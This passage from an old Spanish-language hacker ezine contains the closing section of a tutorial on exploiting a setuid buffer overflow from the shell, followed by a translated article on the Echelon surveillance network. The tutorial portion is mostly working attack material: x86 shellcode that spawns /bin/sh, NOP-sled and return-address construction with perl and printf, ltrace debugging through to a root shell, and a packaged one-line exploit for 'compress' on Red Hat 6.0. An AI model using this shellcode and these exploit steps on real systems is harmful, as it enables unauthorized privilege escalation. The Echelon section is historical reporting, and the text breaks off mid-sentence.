\x04\x03\xcd\x80\x31\xdb\x89\xd8 \x40\xcd\x80\xe8\xd9\xff\xff\xff/bin/sh"`

Y ahora la direccion de retorno dos veces en RET:

[kekabron@info b0f]$ export RET=`printf "\x80\xf5\xff\xbf\x80\xf5\xff\xbf"`

Bien, ahora que ya lo tenemos todo, pasemos a explotar el programilla suid,
lo tenemos todo en las variables de entorno solo tenemos que hacer uso de
estas variables y ejecutar el programa con estas variables(recuerda que
tienes que pasar las variables de entorno desde el mismo shell, si no no
tendremos disponibles todas las variables de entorno:

[kekabron@info b0f]$ programa $NOPS$SHELLC$RET
[kekabron@info b0f]$

Como ? no se supone que a estas alturas deberiamos de ser root ? que ha
pasado ?  vamos a investigar que es lo que ha pasado. Esta claro que el
programa no ha salido con un segmentation fault, es muy raro pero me estoy
temiendo de que el tamaño de $NOPS+$SHELLC+$RET no es el correcto. Vamos a
medir su tamaño porque esto no puede ser:

[kekabron@info b0f]$ echo $NOPS > nops
[kekabron@info b0f]$ echo $SHELLC > shellc
[kekabron@info b0f]$ echo $RET > ret
[kekabron@info b0f]$ wc -c nops shellc ret
    953 nops
     39 shellc
      1 ret
    993 total

Aunque wc(wordcount) nos diga que tiene 953 bytes(1 byte por caracter) en
realidad tiene 952 a todos se les quita una unidad esto quiere decir que el
total es de: 990. Veamos mas detenidamente los nop's estan todos ya que
pusimos 952 y estar estan, la shellcode dijimos que eran 44 bytes y hay
38!!! y en la direccion de retorno no hay nada!! ahora todo el mundo se
preguntara: y como lo vamos a hacer? Pues muy sencillo, primero localizemos
donde se ha cortado la shellcode. Hay algun caracter que hace que la
shellcode no se imprima entera, busquemoslo, como? busquemos el ultimo
caracter que se haya imprimido de la shellcode, esto lo hacemos asi:

	Nota: el vi(editor de texto que estoy utilizando) me hace cosas
              extrañas cuando pego el contenido de SHELLC aqui, por lo que
              solo voy a poner el ultimo y penultimo caracter.

[kekabron@info b0f]$ echo $SHELLC
eU

Bien estos dos caracteres en la shellcode ocupan la posicion 37 y 38, en la
shelcode cada \xAA siendo AA lo que sea, ocupa 1 caracter osea que ya estais
contando y buscando el caracter que nos esta haciendo la puñeta:

  "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
     1    2  3   4   5   6   7   8   9   10  11  12  13
  "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
     14  15  16  17  18  19  20  21  22  23  24  25  26
  "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
     27  28  29  30  31  32  33  34  35  36  37  38  39
  "\xff\xff/bin/sh"
     40  41       

Supongo que os habreis dado cuenta que los caracteres que no se han
imprimido han sido a partir del xd9 = U y xff = EOF(end of file) no se ha
copiado, como vamos a hacerlo para que se copien pues muy sencillo vemos
cual es su valor en ascii y lo pegamos en nuestro codigo:

[kekabron@info b0f]$ printf "\xff\xff\xff/bin/sh"
yyy/bin/sh

Otra pega que teniamos era la direccion de retorno no se habia copiado nada
a la varaible de entorno nada de nada.. como podemos ver tiene el caracter
0xff tambien, solucionemoslo de la misma forma:

[kekabron@info b0f]$ printf "\x80\xf5\xff\xbf\x80\xf5\xff\xbf"
 oy? oy?

	Nota: Los dos espacios que quedan arriaba son nop's no espacios.
Ok ya lo tenemos todo ahora falta juntarlo, ensamblarlo esto lo hacemos asi:

[kekabron@info b0f]$ export n=`perl -e 'printf "\x90"x952'`
[kekabron@info b0f]$ export a=`printf "\xeb\x22\x5e\x89\xf3\x89\xf7\x83
\xc7\x07\x31\xc0\xaa"`
[kekabron@info b0f]$ export b=`printf "\x89\xf9\x89\xf0\xab\x89\xfa\x31
\xc0\xab\xb0\x08\x04"`
[kekabron@info b0f]$ export c=`printf "\x03\xcd\x80\x31\xdb\x89\xd8\x40
\xcd\x80\xe8\xd9"`
[kekabron@info b0f]$ programa $n$a$b$cyyy/bin/sh`printf "\x90"`ny?`printf
"\x90"`ny?
Segmentation fault

Que ha fallado ???

[root@info kekabron]# ltrace -i programa $n$a$b$cyyy/bin/sh`printf
"\x90"`oy? `printf "\x90"`oy?

[08048475] strcpy(0xbffff180, "\220"...) = 0xbffff180
[bfff6f90] --- SIGSEGV (Segmentation fault) ---
[ffffffff] +++ killed by SIGSEGV +++

Misteriosamente ahora nuestra direccion de retorno es 0xbfff6f90 y ret
tiene que apuntar a: 0xbffff180. Corrijamoslo:

[root@info kekabron]# printf "\x80"
 [root@info kekabron]# printf "\xf1"
n[root@info kekabron]# printf "\xff"
y[root@info kekabron]# printf "\xbf"
?[root@info kekabron]#

El caracter 80 es un tipo de nop por lo que no se puede imprimir aqui.
Pasemos a reelaborar la direccion de retorno:

[kekabron@info kekabron]$ programa $n$a$b$cyyy/bin/sh`printf 
"\x80"`ny?`printf "\x80"`ny?
bash#

Bien como habeis podido comprobar se puede explotar un buffer overflow desde
el interprete de comandos y desde luego esta no es la unica forma pero como
nunca he visto nadie que haya hablado sobre esto en un ezine pues he dicho:  
a ver si le gusta esto a la gente... Bueno pues antes de enrollarme con la
despedida y todo eso falta decir que esta claro que hay caracteres que el
interprete de comandos no los interpreta bien, hay que meterselos en su
valor ascii, siempre hay que hacer un estudio de todos estos valores y
añadirlos individualmente para que no se nos corte nuestra cadena
formateada, porque si se corta nuestra cadena no tendra el tamaño deseado y
no podremos explotar el programa.

Nota: Algunos caracteres del output del printf eran caracteres no-ascii,
      por lo tanto se han cambiado por otros para intentar evitar
      incompatibilidades con algunos editores de texto. Con el xploit del
      compress se ha hecho una excepcion en cuanto a dichos caracteres, ya
      que son fundamentales para que su funcionamiento.
 

<++> bofs/compress $b26f8fc081064753ede37364d286f770
# Testeado en redhat 6.0 (2.2.15)
# ejecutar en una misma linea

compress "`perl -e'printf "\x90" x 976'``perl -e'printf"\xeb\x22\x5e\x89
\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0
\xab\xb0\x08\x04\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9"'`ÿÿÿÿÿÿ
/bin/shp÷ÿÿ¿p÷ÿÿ¿"

<-->

				----

	Un saludo a toda la peña que me conoce y espero que este documento
haya sido del agrado de todo el mundo. Espero no haber cometido muchas
faltas de ortografia ya que si lo he hecho cierta persona puede matarme(lo
siento RaiSe xDDD).

	Sin mas un saludo a todos y mandarme dudas sugerencias herratas a
mi direccion de correo.
							By kekabron'00



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x12 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ Proyecto Echelon (1/2) ]-================================================
=-[ por Pope ]-==============================================================




========================
0. ANTES DE EMPEZAR...
========================

	En el presente articulo, asi como en los siguientes de esta serie
para el NetSearch e-zine, se pretende dar a conocer las dimensiones de
Echelon, la mas grande y poderosa red de espionaje jamas concebida.

	En primer lugar, quisiera dejar claro que este documento NO es
original del aqui firmante (aka Pope). Se trata simplemente de una traduccion
del texto en ingles, que puede encontrarse en
http://fly.hiwaay.net/~pspoole/echelon.html . En esta web, el autor original
mantiene un estupendo conjunto de recursos acerca de Echelon: enlaces,
noticias de prensa, publicaciones, informes oficiales, etc. Por tanto, el
merito por la informacion aqui incluida corresponde al autor original de la
web (Patrick S. Poole, pspoole@hiwaay.net), aunque cualquier error que se
encuentre en la traduccion o el contenido sera probablemente cosa mia ;).

	Debido a la extension del texto, he decidido dividirlo en dos partes.
En vuestras manos teneis la primera, y en ella encontrareis la justificacion
historica del Proyecto Echelon, asi como una completa descripcion de la
infraestructura en que se apoya. Para el proximo numero os reservo los
antecedentes de espionaje (politico, comercial, etc.) en EE.UU. que han
desembocado en Echelon, asi como los anteriores proyectos que han
"justificado" estas violaciones de los derechos humanos...



=================
1. INTRODUCCION
=================

	Este documento es un analisis del Proyecto Echelon, la red de
espionaje mas importante del mundo, sostenida principalmente por el gobierno
de los Estados Unidos, y apoyada por el Reino Unido, Canada, Nueva Zelanda y
Australia. En las proximas paginas comentaremos los conflictos legales que
plantea el Proyecto, e intentaremos profundizar en sus bases tecnicas.

	El principal problema que plantea este trabajo es la falta de
informacion oficial sobre el tema: al tratarse de un proyecto secreto, solo
conocemos los datos que periodistas e investigadores han arrojado sobre este
tema despues de años de estudio. En Internet se puede encontrar mucha
informacion sobre Echelon, pero al ser un asunto polemico, es dificil saber
que es cierto y que es exageracion. Por mi parte, intentare ceñirme solo a
informacion respaldada por publicaciones y fundamentada.

	Aunque el principio de la historia puede resultar un poco confusa la
maraña de pactos y alianzas entre gobiernos, se ha tratado de explicar cada
punto, de manera que sea factible comprender el Proyecto Echelon dentro de su
marco historico-temporal.



=============
2. HISTORIA
=============

	Echelon se concibe como el mas importante proyecto de monitorizacion
jamas llevado a cabo, y constituye la red de espionaje mas potente del mundo.
Segun un informe preliminar [1] del Parlamento Europeo (con fecha de enero de
1.998), Echelon es "una red de espionaje que monitoriza rutinariamente
comunicaciones por telefono, fax y email de ciudadanos de todo el mundo, pero
particularmente en Japon y la Union Europea". La publicacion del informe se
reflejo, al menos, en un importante medio de los EEUU, el New York Times [2].


[1] "An appraisal of technologies of political control" ("Una estimacion de
las tecnologias de control politico"), Steve Wright, Parlamento Europeo
(Evaluacion de Opciones Tecnologicas y Cientificas). Luxemburgo, 6 de enero
de 1.998. http://jya.com/stoa-atpc.htm

[2] "European study paints a chilling portrait of technology uses" ("Estudio
europeo plantea una vision escalofriante de los usos de la tecnologia"),
Bruno Giusanni. The New York Times. 24 de febrero de 1.998.
http://www.nytimes.com/library/cyber/euro/022498euro.html

	En la actualidad, Echelon es una enorme red de estaciones de
espionaje electronico repartidas por todo el mundo y mantenidas
principalmente por los 5 paises nombrados anteriormente: EEUU, Reino Unido,
Canada, Nueva Zelanda y Australia. Segun la Alianza UKUSA, estos paises
espian las comunicaciones de todos los demas interceptando y tratando
electronicamente la practica totalidad de transmisiones telefonicas, de fax o
de email, a traves de los supercomputadores de la NSA (Agencia de Seguridad
Nacional de los EEUU), examinando estas transmisiones en busca de palabras
clave (contenidas en los llamados "diccionarios Echelon").

	La mayoria de los detalles del Proyecto Echelon y la Alianza UKUSA
siguen siendo un misterio. Lo que se conoce hasta ahora es el resultado de
los esfuerzos de periodistas e investigadores de todo el mundo, y de su
trabajo por desenmascarar los mas secretos trabajos del gobierno
norteamericano. La publicacion en 1.996 del libro "Secret Power: New
Zealand's Role in the International Spy Network" ("Poder oculto: El papel de
Nueva Zelanda en la red de espionaje internacional") por el periodista
neocelandes Nicky Hager es el documento mas detallado sobre el Proyecto [3].

[3] http://www.fas.org/irp/eprint/sp/index.html


2.1. Antecedentes
-------------------

	La victoria de los Aliados en la II Guerra Mundial se debio en gran
parte a su capacidad de recopilar informacion de los servicios de
inteligencia enemigos y descifrar esta informacion. A esto hay que añadir que
los Aliados disponian a su vez de mejores sistemas de encriptacion, que
permitian a sus datos viajar de forma segura.

	Pero al acabar la Guerra surgia una nueva potencia, la Union
Sovietica, que se convertiria en el centro de atencion de los servicios de
inteligencia; estos debian asegurar el balance de poderes en la Tierra.
Durante 40 años se han desarrollado sistemas cada vez mas potentes,
desembocando en lo que ahora se conoce como Proyecto Echelon.

	La base burocratica del Proyecto es la Alianza UKUSA, que partio de
otra alianza, BRUSA, que nacio a su vez en los primeros dias de la Guerra
Fria y fue ratificada el 17 de mayo de 1.943 por los EEUU y el Reino Unido
[4]. En 1.946-47 se suscribe la Commonwealth SIGINT Organization, alianza de
los servicios de inteligencia de posguerra del Reino Unido, Canada, Australia
y Nueva Zelanda [5]. En 1.947, la alianza UKUSA (aun hoy secreta) definio las
relaciones entre los departamentos de inteligencia de los distintos
gobiernos. Otros pactos entre estos paises y el gobierno de EEUU profundizan
en estas relaciones.

[4] "The ties that bind: Intelligence cooperation between the UKUSA
countries" ("Lazos fuertes: cooperacion de inteligencia entre los paises de
UKUSA"), Desmond Ball y Jeffrey Richelson. Boston: Allen & Unwin, 1.985. Pp.
137-138.
http://www.amazon.com/exec/obidos/ASIN/0045200092/qid=909414912/sr=1-11/002-3
166366-4403036

[5] idem, pp. 142-143.

	Por encima de estas organizaciones aparece la Agencia de Seguridad
Nacional de EEUU, NSA, que se centra en los intereses de los norteamericanos,
y que se definio como "la primera parte del tratado UKUSA". El GCHQ
(Government Communications Headquarters, cuartel general de comunicaciones
del gobierno britanico) suscribio la alianza UKUSA por parte del Reino Unido
y sus aliados de la Commonwealth SIGINT, lo que incluyo en el pacto al
Consejo de Administracion de Transmisiones de Defensa (DSD, Defense Signals
Directorate) de Australia, las Fuerzas de Seguridad para las Comunicaciones
(CSE, Communications Security Establishment) canadienses, y el Departamento
de Seguridad para las Comunicaciones del Gobierno (GCSB, Government
Communications Security Bureau) de Nueva Zelanda. Estos paises estan tambien
unidos entre si por otros tratados, y se les considera "la segunda parte del
tratado UKUSA". Hay terceras partes, que incluyen paises como Alemania,
Turquia, Japon, Noruega y Corea del Sur. Otras fuentes indican que China
podria estar tambien incluida en el tratado, con limitaciones [6].

[6] "Secret Power", p. 40. Ver nota [3].


2.2. NSA
----------

	El principal beneficiario del pacto UKUSA es, sin lugar a dudas, la
Agencia de Seguridad Nacional de EEUU, la NSA. La mayor parte de los fondos
para proyectos comunes, asi como la direccion de operaciones de inteligencia,
se gestionan sobre todo desde la NSA. Las agencias del pacto suelen
intercambiar personal, repartirse el trabajo y establecer unos parametros
para clasificar y proteger informacion que comparten entre ellas. Por su
parte, la NSA utiliza su posicion de mayor agencia de espionaje del mundo
para dirigir a sus aliados internacionales.

	La NSA nace de la mano del presidente Harry Truman en 1.952, por
orden de una directiva presidencial que aun hoy es secreta. De hecho, la
existencia de la Agencia no fue reconocida por el gobierno norteamericano
hasta 1.957. Su mision original era dirigir los departamentos de 
Inteligencia de Transmisiones (SIGINT, Signals Intelligence) y de Seguridad
de Comunicaciones (COMSEC, Communications Security) en los EEUU. El
presidente Ronald Reagan añadio a estas tareas la seguridad de los sistemas
de informacion y la formacion en seguridad de operaciones, en 1.984 y 1.988
respectivamente. Asimismo, una ley de 1.986 encarga a la NSA el soporte a las
operaciones de combate del Departamento de Defensa [7].

[7] http://www.nsa.gov:8080/about

	Con sede en Fort George Meade, entre Washington DC y Baltimore
(Maryland), la NSA dirige el equipo de instalaciones y personal de
inteligencia mas importante del mundo. Dan trabajo a un gran numero de
matematicos, entre ellos los mejores creadores y rompedores de codigos. El
trabajo de estos ultimos consiste en romper la encriptacion de sistemas de
comunicaciones electronicas que se construyan en el extranjero o dentro de
EEUU; los mensajes descifrados pasan al equipo de lingüistas, que los
analizan en unos 100 idiomas diferentes. La NSA es responsable tambien de los
codigos que protegen las comunicaciones del gobierno estadounidense.



===================
3. LA RED ECHELON
===================

	La red del Proyecto, fruto del pacto UKUSA, se extiende por todo el
planeta y mas alla, con estaciones terrestres de intercepcion, barcos en
todos los oceanos y satelites de alto secreto, que ayudan al control de la
NSA y los paises de UKUSA sobre las comunicaciones de todo el planeta. Muy
pocas señales escapan a este minucioso rastreo.

	Los paises de la alianza UKUSA se han repartido el planeta, de forma
que cada uno se centra en las comunicaciones de una zona:
  . La NSA de EEUU cubre todo el continente americano.
  . El GCHQ del Reino Unido se ocupa de Europa, africa y la parte occidental
de Rusia (hasta los montes Urales).
  . El DSD de Australia se centra en el sudeste de Asia, el sudeste del
oceano Pacifico y el este del oceano indico.
  . El GSCB de Nueva Zelanda recoge señales en el sur del oceano Pacifico,
centrandose en las islas de esa zona.
  . El CSE de Canada se ocupa de la intercepcion en el norte de Rusia y
Europa, y tambien cubre America [8].

[8] "The ties that bind", p. 143. Ver nota [4].


3.1. Instalaciones
--------------------

	El punto fuerte de Echelon son las estaciones de recepcion masiva
dirigidas hacia los satelites INTELSAT e INMARSAT, responsables de la mayoria
de las comunicaciones internacionales e intercontinentales por telefono y
fax. Los 20 satelites INTELSAT giran en una orbita geoestacionaria sobre
puntos fijos del Ecuador [9]; se ocupan sobre todo de trafico civil, pero
tambien de informacion diplomatica y gubernamental de especial interes para
los paises de UKUSA.

[9] Las zonas de cobertura de los INTELSAT se pueden consultar en su web:
http://www.intelsat.com/cmc/connect/globalmap.htm

	Originalmente solo hacian falta dos estaciones para interceptar las
comunicaciones por INTELSAT: Morwenstow (Inglaterra) y Yakima (Washington).
Pero los INTELSAT 5 fueron reemplazados por las series 701 y 703, con mayor
precision en la transmision que impedia que las señales del hemisferio sur
fueran captadas desde Yakima (hemisferio norte), asi que se ampliaron las
instalaciones en Australia y Nueva Zelanda [10].

[10] "Secret Power", p. 28. Ver nota [3].

	Actualmente, la estacion de Morwenstow intercepta las señales de los
INTELSAT que se mueven sobre los oceanos Atlantico e indico, que transmiten a
Europa, africa y Asia occidental. La estacion de Yakima se centra en
comunicaciones a traves del oceano Pacifico en el hemisferio norte, asi como
en Oriente Medio. Otro centro de la NSA, en Sugar Grove (Virginia
occidental), controla todo el trafico del continente americano. Asia, los
paises del Pacifico sur y el oceano Pacifico se controlan desde una base del
DSD en Geraldton (Australia) y la estacion de Waihopai (Nueva Zelanda) del
GSCB. Otro centro en Isla Ascension (Oceano Atlantico, entre Brasil y Angola)
controla presuntamente las comunicaciones del oceano Atlantico en el
hemisferio sur [11].

[11] idem, p. 35.

	El resto de los satelites (no INTELSAT) se monitorizan desde estas
estaciones, asi como desde bases en Menwith Hill (Inglaterra), Shoal Bay
(Australia), Leitrim (Canada), Bad Aibling (Alemania) y Misawa (Japon). Por
lo general los satelites llevan trafico regional y de Rusia [12]. Se sabe que
las instalaciones en Shoal Bay monitorizan algunos satelites de Indonesia, y
que la base de Leitrim intercepta las comunicaciones de satelites
latinoamericanos, entre ellos el satelite Morelos de la compañia telefonica
mejicana [13].

[12] idem

[13] "Un systeme de surveillance mondial" ("Un sistema de observacion
mundial"). Marco Campagna. Cahiers de Television (CTV-France), junio de
1.998.
http://www.mygale.org/06/alsb/Espionnage/UnSystemeDeSurveillanceMondial.html 

Peter Hum, "I spy" ("Yo espio"), diario The Ottawa Citizen, 10 de mayo de
1.997.

	Varias decenas de estaciones de recepcion de radio, pertenecientes a
los paises de UKUSA, pueblan la tierra, situadas por ejemplo en centros
militares. El papel de estas estaciones fue muy importante en los años
previos al desarrollo de las comunicaciones por satelite, porque la mayoria
del trafico de informacion mundial se transmitia en frecuencias de radio. Las
comunicaciones por radio siguen siendo muy utiles a pesar de la extension de
los satelites, dada su capacidad para llegar a naves militares en mar y aire.
Dentro de territorios nacionales se utilizan tambien señales en VHF (Very
High Frequency, muy alta frecuencia) y UHF (Ultra High Frecuency, frecuencia
superior). Como estaciones de radio importantes de los paises UKUSA podemos
citar Tangimoana (Nueva Zelanda), Bamaga (Australia) y la base comun de la
NSA y el GCHQ en el atolon de Diego Garcia (oceano indico) [14].

[14] "Secret Power", pp. 35-36, 150; ver nota [3]. "The ties that bind", pp.
204-207; ver nota [4].

	Una red aparte, de HFDF (High Frequency Direction Finding, busqueda
de direcciones en alta frecuencia) intercepta señales con el unico proposito
de localizar la posicion de barcos y aviones. Aunque no se dedican a analizar
el contenido de los mensajes interceptados, el papel de estos centros es
crucial a la hora de seguir objetivos militares moviles. El papel del CSE
canadiense en la red HFDF de UKUSA (nombre en clave: CLASSIC BULLSEYE) es muy
importante, pues aloja gran parte de las estaciones de los oceanos Atlantico
e indico que siguieron los movimientos de los buques y submarinos rusos
durante la Guerra Fria. Las estaciones van desde Kingston y Leitrim (Ontario)
hasta Gander (Newfoundland), para rastrear el oceano Atlantico; desde Alert,
en el punto mas al norte de Canada (oceano artico) se interceptan las
comunicaciones entre bases de submarinos rusos situadas en Petropavlovsk y
Vladivostok; por ultimo, desde Masset (Columbia britanica) se monitorizan
rutas maritimas y aereas bajo el mando de la NSA [15]. La CSE tiene tambien
un pequeño centro en la Base de las Fuerzas Aereas de Lackland, San Antonio,
Texas, que probablemente monitoriza las comunicaciones de objetivos
latinoamericanos.

[15] "Spyworld: How CSE spies on Canadians and the World" ("Mundo espia: como
la CSE espia a los canadienses y al mundo"). Mike Frost y Michael Graton.
Toronto: Seal / McClelland-Bantam, 1.995. p. 35.
http://www.bookexpress.com/prd.i/pgen/BookExpress/0L/display.book.html;isbn=
0770427073

	Otra parte importante de la infraestructura de Echelon es la red de
satelites espia de EEUU, asi como las estaciones receptoras repartidas por
los paises de la alianza UKUSA. Estos satelites recogen el trafico terrestre
de ondas de radio, microondas y telefonia movil; fueron puestos en orbita por
la NSA, en colaboracion con sus agencias hermanas, la NRO (National
Reconnaisance Office, Oficina Nacional de Reconocimiento) y la CIA (Central
Intelligence Agency, Agencia Central de Inteligencia). La serie de satelites
Ferret en los años 60; los Canyon, Rhyolite y Aquacade en los 70; los Chalet,
Vortex, Magnum, Orion y Jumpseat en los 80. Y finalmente, en los 90, los
avanzados Mercury, Mentor y Trumpet.

	Estos satelites de observacion recogen comunicaciones electronicas,
conversaciones por telefono movil y diversas transmisiones de radio. Las
estaciones de enlace de bajada (downlink stations) que controlan el
funcionamiento y los objetivos de los satelites estan bajo control exclusivo
de los Estados Unidos, incluso aunque puedan estar situadas en otros paises.
Las dos bases principales se encuentran en Menwith Hill (Inglaterra) y Pine
Gap (Australia).

    TABLA: Satelites espia de EE.UU. operativos en la actualidad [16]
    -----------------------------------------------------------------
[16] "Spy satellites enter new dimension" ("Los satelites espia entran en una
nueva dimension"). MSNBC y NBC News, 8 de agosto de 1.998.
http://www.msnbc.com/news/185953.asp

Advanced KH-11
	Cantidad: 3
	Altura (km): 322
	Fabricante: Lockheed Martin
	Finalidad: Fotografia; resolucion: 13 cm

LaCrosse Radar Imaging
	Cantidad: 2
	Altura (km): 322-644
	Fabricante: Lockheed Martin
	Finalidad: Fotografia; resolucion: 1-4 m

Orion / Vortex
	Cantidad: 3
	Altura (km): 35888
	Fabricante: TRW
	Finalidad: Monitorizacion de telecomunicaciones

Trumpet
	Cantidad: 2
	Altura (km): 200-35888
	Fabricante: Boeing
	Finalidad: Monitorizacion de telefonia movil

Parsae
	Cantidad: 3
	Altura (km): 966
	Fabricante: TRW
	Finalidad: Monitorizacion oceanica

Satellite Data Systems
	Cantidad: 2
	Altura (km): 200-35888
	Fabricante: Hughes
	Finalidad: Retransmision de datos

Defense Support Program
	Cantidad: 4+
	Altura (km): 35888
	Fabricante: TRW / AeroJet
	Finalidad: Alerta de misiles

Defense Meteorologic Support Program
	Cantidad: 2
	Altura (km): 805
	Fabricante: Lockheed Martin
	Finalidad: Meteorologia y deteccion de detonaciones nucleares


3.2. Menwith Hill 
-------------------

	Las instalaciones de Menwith Hill se encuentran en North Yorkshire,
cerca de Harrogate, Inglaterra. El importante papel de esta base se refleja
en el informe del Parlamento Europeo: "Dentro de Europa, todas las
comunicaciones por email, fax o telefono son interceptadas sistematicamente
por la Agencia de Seguridad Nacional de Estados Unidos, transmitiendo toda la
informacion recogida a Londres, y de ahi, por satelite, a Fort Meade
(Maryland), a traves del concentrador de Menwith Hill, en North Yorkshire,
Reino Unido" [17].

[17] "An Appraisal of technology of political control", p. 19. Ver nota [1].

	La existencia e importancia de esta base fue desvelada por el
periodista e investigador britanico Duncan Campbell en 1.980 [18]. Hoy en dia
es el centro de espionaje mas grande del mundo, con unas 25 estaciones de
recepcion de satelites y 1.400 trabajadores de la NSA americana colaborando
con otras 350 personas del Ministerio de Defensa del Reino Unido. Tras la
noticia de que la base coordina la observacion de gran parte de Europa, este
centro se ha convertido en objetivo de frecuentes manifestaciones y protestas
organizadas por grupos pacifistas locales. Asimismo, en la actualidad es
tambien victima de fuertes criticas por parte de altos cargos europeos al
tanto de la observacion civil y el espionaje industrial que EEUU desarrolla
en esa estacion [19].

[18] "American's big ear on Europe" ("La oreja grande de America en Europa").
Duncan Campbell (http://www.gn.apc.org/duncan/) y Linda Melvern. New
Statesman, 18 de julio de 1.980, pp. 10-14.

[19] "EU simmers over Menwith listening post" ("La Union Europea, indignada
por la estacion de escucha de Menwith"). Simon Davies. London Telegraph, 16
de julio de 1.998.
http://www.telegraph.co.uk/et?ac=001046270339177&rtmo=f3f0aNVs&atmo=99999999
pg=/et/98/7/16/ecfspy16.html

	El nacimiento de la base se remonta a diciembre de 1.951, cuando las
Fuerzas Aereas de EEUU y el Departamento de Defensa britanico suscribieron un
contrato de arrendamiento por unos terrenos del gobierno britanico. La NSA se
encarga del arrendamiento de la base desde 1.966, y lleva ampliando las
instalaciones desde entonces. Hasta mediados de los 70, en Menwith Hill se
interceptaban comunicaciones por ILC (International Leased Carrier, portador
internacional alquilado) y NDC (Non-diplomatic Communications, comuniaciones
no diplomaticas). Habiendo recibido una de las primeras maquinas sofisticadas
de IBM, la estacion rastreaba tambien el trafico no cifrado por telex, que
contenia mensajes, telegramas y llamadas telefonicas internacionales de
contenido gubernamental, empresarial y civil, en busca de cualquier
informacion de valor, ya fuera de caracter politico, militar o economico
[20].

[20] "Spy Station F83" ("Estacion Espia F83"). Nicholas Rufford. The Sunday
Times londinense, 31 de mayo de 1.998.
http://www.the-times.co.uk/news/pages/sti/98/05/31/stifocnws01003.html?112407

	Al añadir a Menwith Hill la primera base de intercepcion de satelites
en 1.974 se aumento la potencia de la estacion en cuestion de espionaje.
Durante la construccion de esa zona se colocaron 8 platos de recepcion de
satelites. Actualmente en la zona existen muchos mas sistemas [21]:

  . STEEPLEBUSH: Completado en 1.984, y con un coste de 160 millones de
dolares, amplio considerablemente la capacidad de rastreo de satelites de la
estacion, pues su sistema anterior databa de 1.974, fecha de construccion de
la base.

  . RUNWAY: Este sistema se expande por todas las instalaciones, captando la
señal de los satelites Vortex de 2ª generacion, geosincronos, y trafico
diverso de Europa, Asia y la antigua Union Sovietica. Despues la informacion
es procesada por los ordenadores de la base. Este sistema puede haber sido
reemplazado o completado por otro, RUTLEY.

  . PUSHER: Sistema HFDF (High Frequency Direction Finding, buscador de
direcciones en alta frecuencia) que cubre el rango de frecuencias de 3-30 MHz
(transmisiones de radio desde emisoras publicas, walkie-talkies y otros
dispositivos). Su objetivo principal son comunicaciones de navegacion
maritima y aerea, militares y diplomaticas.

  . MOONPENNY: Descubierto por el periodista britanico Duncan Campbell en los
años 80, este sistema se dedica a espiar satelites de otros paises, asi como
los INTELSAT sobre los oceanos Atlantico e indico.

  . KNOBSTICKS I y II: Se desconoce el objetivo de estas antenas, pero se
presume que podrian rastrear trafico militar y diplomatico transeuropeo.

  . GT-6: Instalado a finales de 1.996, se cree que intercepta las señales de
los satelites geosincronos de 3ª generacion, Advanced Orion (tambien
conocidos como Advanced Vortex). Un nuevo satelite en orbita polar, Advanced
Jumpseat, podria estar siendo tambien monitorizado desde aqui.

  . STEEPLEBUSH II: Es una ampliacion del sistema STEEPLEBLUSH original
(1.984); este ordenador procesa la informacion del sistema RUNWAY, recogida
de los satelites Vortex.

  . SILKWORTH: Es el sistema principal de ordenadores de Menwith Hill,
fabricado por Lockheed Corporation. Procesa la mayoria de la informacion que
recogen los otros sistemas.

[21] "Somebody's listening" ("Alguien escucha"). Duncan Campbell
(http://www.gn.apc.org/duncan/). The New Statesman, 12 de agosto de 1.988,
pp. 10-12. http://jya.com/echelon-dc.htm
"The Hill" ("La colina"). Comunicados, canal 4 de la BBC, 6 de octubre de
1.993 (trascripcion disponible por Duncan Campbell).
"Space-Intelligence Technology's Embattled Frontier" ("La discutida frontera
de la inteligencia espacial"). Electronic Engineering Times, 12 de abril de
1.997. http://www.eet.com/news/97/951news/ space.html
"Cracking the Menwith codes" ("Rompiendo los codigos de Menwith"). Nicholas
Rufford. The Sunday Times londinense, 31 de mayo de 1.998.
http://www.the-times.co.uk/news/pages/sti/98/05/31/stifocnws02002.html?11240
27

	En 1.997 salio a la luz un dato importante sobre Menwith Hill durante
el juicio a dos mujeres pacifistas que exponian sus razones para haber
accedido ilegalmente a las instalaciones. Documentos y testimonios de British
Telecomm, presentados por R. G. Morris, director de Planes de Emergencia de
British Telecomm, mostraban que al menos 3 lineas troncales de fibra optica,
de trafico telefonico nacional, y capaces de transportar mas de 100.000
llamadas simultaneamente cada una, atravesaban las instalaciones de Menwith
Hill [22]. Esto posibilitaba que la NSA tuviera acceso a gran parte del
trafico de British Telecomm. El juez Jonathan Crabtree reprendio a British
Telecomm por sus declaraciones y prohibio a Morris comparecer de nuevo en el
juicio, alegando razones de "seguridad nacional". Segun Duncan Campbell, la
alianza para espionaje entre Menwith Hill y British Telecomm comenzo en 1.975
con un cable coaxial desde las instalaciones de microondas de BT en Hunter's
Stone, a 6'5 km. de Menwith Hill; esta conexion se mantiene hoy en dia [23].

[22] "BT condemned for Listing Cables to US SIGINT Station" ("BT condenada
por informar sobre los cables hacia la Estacion de Inteligencia de EEUU"). 4
de septiembre de 1.997. http://www.gn.apc.org/ duncan/menwith.htm

[23] idem. "Spy Station F83", ver nota [20].

	Sistemas adicionales (TROUTMAN, ULTRAPURE, TOTALISER, SILVERWEED,
RUCKUS y otros) completan la impresionante lista de instalaciones de
inteligencia en Menwith Hill. Dirigiendo sus antenas hacia descuidados
satelites en orbita, recibiendo asimismo señales de otros satelites que
monitorizan las comunicaciones terrestres, interceptando señales de radio y
pinchando las redes terrestres, Menwith Side, junto con sus estaciones
hermanas en Pine Gap (Australia) y Bad Aibling (Alemania), muestra el
despliegue de la NSA y sus aliados UKUSA para rastrear, por medio de su red
espia, toda señal de comunicacion.


3.3. Los diccionarios Echelon

	Las posibilidades de intercepcion de Echelon es ya de por si una
realidad escalofriante. Pero a esto hay que añadir su capacidad para
desencriptar, filtrar, examinar y clasificar estos mensajes para su posterior
analisis por agentes de inteligencia de las agencias firmantes de UKUSA. Al
llegar las señales a las estaciones, son procesadas por sistemas como el
